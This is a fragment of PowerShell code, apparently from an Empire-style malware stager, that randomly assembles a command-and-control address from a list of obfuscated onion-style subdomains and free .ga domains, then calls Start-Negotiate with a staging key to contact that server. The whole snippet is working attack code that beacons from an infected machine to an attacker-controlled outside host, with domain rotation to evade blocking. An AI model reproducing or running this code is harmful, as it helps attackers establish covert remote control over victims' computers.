...
$torservers = "oragurpvgkparzr5", "oragur5z5fai4jbh", "oragur3inzg5vpmv", "oragurtayaze3e75", "oragurmwofwajynn", "oragurrqiqon3zy2";
$randomtor = Get-Random -Maximum $torservers.length;
$tordomains = "1banzin.ga","2banzi.ga","3banzi.ga";
$randomdom = Get-Random -Maximum $tordomains.Length;
$newserver = 'http://'+$torservers[$randomtor]+'.'+$tordomains[$randomdom]+':80';

# Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
Start-Negotiate -s "$newserver" -SK 'REPLACE_STAGING_KEY' -UA $u;
